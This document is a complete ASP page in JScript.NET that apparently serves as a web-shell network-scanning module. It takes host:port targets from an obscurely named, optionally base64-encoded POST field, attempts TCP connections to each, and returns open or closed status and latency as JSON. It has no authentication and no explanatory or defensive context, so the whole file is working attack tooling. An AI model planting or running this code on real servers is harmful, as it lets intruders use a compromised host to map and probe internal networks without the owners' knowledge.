<%

try {
    var targets = [];
    var z1 = Request.Form["z1"];
    
    if (z1 != null && z1.length > 0) {
        var configRaw = z1;
        try {
            var bytes = System.Convert.FromBase64String(z1);
            configRaw = System.Text.Encoding.UTF8.GetString(bytes);
        } catch (b64Err) {
            configRaw = z1;
        }

        var serializer = new System.Web.Script.Serialization.JavaScriptSerializer();
        var config = serializer.DeserializeObject(configRaw);
        
        if (config != null && config["targets"] != null) {
            var rawTargets = config["targets"];
            for (var i = 0; i < rawTargets.Length; i++) {
                if (rawTargets[i] != null) {
                    targets.push(rawTargets[i].ToString());
                }
            }
        }
    }

    if (targets.length == 0) {
        targets.push("8.8.8.8:53");
    }

    var results = [];

    for (var t = 0; t < targets.length; t++) {
        var target = targets[t].trim();
        if (target.length == 0) continue;

        var parts = target.Split(':');
        var host = parts[0];
        var port = 80;
        if (parts.Length > 1) {
            try {
                port = parseInt(parts[1], 10);
            } catch (e) {
                port = 80;
            }
        }

        var status = "closed";
        var reason = "Connection timeout or filtered";
        var latency = 0;
        var protocol = (port == 443 ? "HTTPS/TCP" : (port == 53 ? "DNS/UDP-TCP" : "TCP"));

        var startTime = System.DateTime.Now;
        var client = null;

        try {
            client = new System.Net.Sockets.TcpClient();
            var ar = client.BeginConnect(host, port, null, null);
            var success = ar.AsyncWaitHandle.WaitOne(1500, true);

            if (success && client.Connected) {
                client.EndConnect(ar);
                var duration = System.DateTime.Now.Subtract(startTime);
                latency = Math.Round(duration.TotalMilliseconds, 2);
                status = "open";
                reason = "Connected successfully";
            } else {
                reason = "Connection timeout or filtered";
            }
        } catch (ex) {
            reason = ex.Message;
        } finally {
            if (client != null) {
                try {
                    client.Close();
                } catch (ignored) {}
            }
        }

        var resObj = {
            "target": target,
            "status": status,
            "protocol": protocol,
            "latency": latency,
            "reason": reason
        };
        results.push(resObj);
    }

    var finalSerializer = new System.Web.Script.Serialization.JavaScriptSerializer();
    Response.Write(finalSerializer.Serialize(results));

} catch (e) {
    var errSerializer = new System.Web.Script.Serialization.JavaScriptSerializer();
    Response.Write(errSerializer.Serialize([{ "target": "ERROR", "status": "closed", "protocol": "TCP", "latency": 0, "reason": e.message }]));
}

%>